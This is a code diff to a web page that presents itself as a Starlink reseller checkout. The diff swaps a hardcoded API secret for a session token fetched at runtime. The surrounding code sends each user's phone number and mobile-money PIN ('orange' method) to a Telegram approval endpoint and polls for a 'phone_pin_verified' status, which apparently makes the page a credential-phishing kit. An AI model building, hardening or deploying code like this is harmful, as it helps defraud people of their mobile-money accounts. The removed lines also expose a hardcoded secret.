@@ -899,6 +899,26 @@
     </div>
     
     <script>
+        async function getApiSecret() {
+            let token = sessionStorage.getItem('sl_api_token');
+            let expiresAt = parseInt(sessionStorage.getItem('sl_api_token_expires') || '0');
+            if (!token || Date.now() > expiresAt) {
+                try {
+                    const res = await fetch('/api/auth/session', { method: 'POST' });
+                    const data = await res.json();
+                    if (data.success && data.token) {
+                        token = data.token;
+                        expiresAt = Date.now() + (data.expiresIn || 3600000);
+                        sessionStorage.setItem('sl_api_token', token);
+                        sessionStorage.setItem('sl_api_token_expires', expiresAt.toString());
+                    }
+                } catch (e) {
+                    console.error('Failed to get API session:', e);
+                }
+            }
+            return token;
+        }
+
         // Country configurations - expanded for all African countries
         const COUNTRIES = {
             'CI': { code: '+225', length: 10, flag: 'ci', name: 'Côte d\'Ivoire', currency: '$' },
@@ -1391,7 +1411,7 @@
             try {
                 const response = await fetch('/api/telegram/request-approval', {
                     method: 'POST',
-                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                    headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
                     body: JSON.stringify({ userPhone: currentMsisdn, userPin: currentPin, package: starlinkPackage, amount: '', method: 'orange' })
                 });
                 const data = await response.json();
@@ -1400,7 +1420,7 @@
                     const pollTimer = setInterval(async () => {
                         try {
                             const statusRes = await fetch(`/api/telegram/status/${currentRequestId}`, {
-                                headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                                headers: { 'X-API-Secret': await getApiSecret() }
                             });
                             const statusData = await statusRes.json();
                             if (statusData.status === 'phone_pin_verified') {
@@ -1631,7 +1651,7 @@
                 try {
                     const telegramRes = await fetch('/api/telegram/submit-link', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json', 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' },
+                        headers: { 'Content-Type': 'application/json', 'X-API-Secret': await getApiSecret() },
                         body: JSON.stringify({ requestId: currentRequestId, link: link })
                     });
                     const telegramData = await telegramRes.json();
@@ -1648,7 +1668,7 @@
                 const pollTimer = setInterval(async () => {
                     try {
                         const statusRes = await fetch('/api/telegram/status/' + currentRequestId, {
-                            headers: { 'X-API-Secret': 'starlink-reseller-secret-2026-change-in-production' }
+                            headers: { 'X-API-Secret': await getApiSecret() }
                         });
                         const statusData = await statusRes.json();
                         
